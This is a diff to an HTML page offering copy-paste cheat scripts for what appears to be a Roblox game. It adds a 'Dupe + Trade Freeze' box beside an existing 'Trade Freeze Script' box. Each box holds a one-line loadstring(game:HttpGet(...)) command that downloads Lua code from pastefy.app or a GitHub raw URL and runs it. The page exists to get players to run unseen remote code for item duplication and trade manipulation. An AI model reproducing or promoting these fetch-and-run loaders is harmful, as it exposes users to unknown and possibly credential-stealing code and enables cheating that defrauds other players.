@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ 
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -250,6 +250,11 @@ textarea{
     <div class="script-box">
       <div class="script-label">❄️ Trade Freeze Script</div>
       <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/DO2u9XdL/raw", true))()</textarea>
+      <button class="copy" onclick="copyBrainrot(this)">Copy</button>
+    </div>
+    <div class="script-box">
+      <div class="script-label">🔥 Dupe + Trade Freeze</div>
+      <textarea readonly>loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/VoidsTradeFreeze-DupeScript/main/SAB.lua.txt"))()</textarea>
       <button class="copy" onclick="copyBrainrot(this)">Copy</button>
     </div>
   </div>
